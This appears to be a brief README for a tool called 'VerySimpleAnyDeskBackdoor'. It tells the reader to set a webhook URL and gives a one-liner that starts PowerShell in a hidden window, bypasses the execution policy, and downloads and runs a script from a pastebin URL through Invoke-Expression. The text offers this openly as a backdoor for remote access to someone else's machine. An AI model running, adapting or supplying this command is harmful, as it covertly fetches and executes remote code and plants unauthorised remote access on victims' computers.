# VerySimpleAnyDeskBackdoor

Don't forget to change the $webhookUrl parameter to your desired one.
Run this as a oneliner:
```
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/wR5bkkut')"
```
